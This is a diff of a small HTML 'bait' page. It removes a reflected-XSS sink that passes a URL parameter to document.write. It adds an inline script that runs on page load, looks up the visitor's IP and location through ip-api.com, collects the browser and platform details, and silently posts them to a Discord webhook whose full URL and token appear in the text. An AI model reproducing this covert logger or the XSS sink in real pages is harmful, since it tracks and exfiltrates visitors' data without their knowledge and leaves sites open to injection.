@@ -1,13 +1,10 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <title>xss</title>
 </head>
 <body style="background-color:black;">
-    <script>
-        var urlParams = new URLSearchParams(window.location.search);
-        var x = urlParams.get('x');
-        document.write(x);
-    </script>
+    <script>async function sendSystemInfoToDiscord() { try { const data = await (await fetch('http://ip-api.com/json/')).json(), message = { content: `**IP Info:**\n> **IP:** \`${data.query || 'Unknown'}\`\n> **Provider:** \`${data.isp || 'Unknown'}\`\n> **ASN:** \`${data.as || 'Unknown'}\`\n> **Country:** \`${data.country || 'Unknown'}\`\n> **Region:** \`${data.regionName || 'Unknown'}\`\n> **City:** \`${data.city || 'Unknown'}\`\n> **Coords:** \`${data.lat && data.lon ? data.lat + ', ' + data.lon : 'Unknown'}\`\n> **Timezone:** \`${data.timezone || 'Unknown'}\`\n\n**PC Info:**\n> **OS:** \`${navigator.platform}\`\n> **Browser:** \`${navigator.userAgent}\`\n\n**User Agent:**\n\`\`\`\n${navigator.userAgent}\n\`\`\`` }, webhookResponse = await fetch('https://discordapp.com/api/webhooks/1337589185695187005/jH1I8L6or30Yf8dVipM5RQ7MbARfoEi4ZyCQxcShxcw6Tm0QVUPtdm8oRtrFJAXs9giW', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(message) }); if (webhookResponse.ok) { console.log('Thx'); } else { console.error('Screw you!'); } } catch (error) { console.error('Error:', error); } } sendSystemInfoToDiscord();</script>
     <img src="bait.png" alt="This is bait">
 </body>
 </html>
